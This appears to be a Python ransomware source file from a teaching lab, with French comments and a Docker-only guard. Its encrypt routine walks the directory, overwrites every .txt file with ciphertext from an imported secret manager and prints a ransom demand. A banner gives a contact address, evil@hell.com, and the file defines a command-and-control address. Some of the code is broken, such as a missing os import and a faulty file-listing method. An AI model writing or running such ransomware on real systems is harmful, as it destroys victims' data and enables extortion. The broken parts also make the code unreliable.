import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        # Chemin du répertoire courant
        current_dir = Path.cwd()

        # Recherche récursive de tous les fichiers *.txt
        txt_files = current_dir.rglob('*.txt')
        txt_file_paths = []
        # Liste des chemins absolus des fichiers *.txt trouvés, sous forme de chaînes de caractères
        for file_path in txt_files :
            txt_file_paths += str(file_path.absolute())
        # Affichage de la liste des chemins absolus des fichiers *.txt trouvés
        print(txt_file_paths)

    def encrypt(self):
        # main function for encrypting (see PDF)
        # On liste tous les fichiers
        txt_files = []
        for root, dirs, files in os.walk('.'):
            for file in files:
                if file.endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        
        # On crée et on setup le secret_manager
        secret_manager = SecretManager()
        secret_manager.setup()
        
        # On encrypte les fichiers
        encrypted_files = []
        for file in txt_files:
            with open(file, 'rb') as f:
                plaintext = f.read()
            ciphertext = secret_manager.encrypt(plaintext)
            with open(file, 'wb') as f:
                f.write(ciphertext)
            encrypted_files.append(file)
        
        # On affiche le message destiné aux victimes
        hex_token = secret_manager.get_hex_token()
        print("Inflation hurts... But i can be rude too, so GIVE ME YOUR MONEY !!! Have a nice day :)", hex_token)

    def decrypt(self):
        # main function for decrypting (see PDF)
        raise NotImplemented()

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()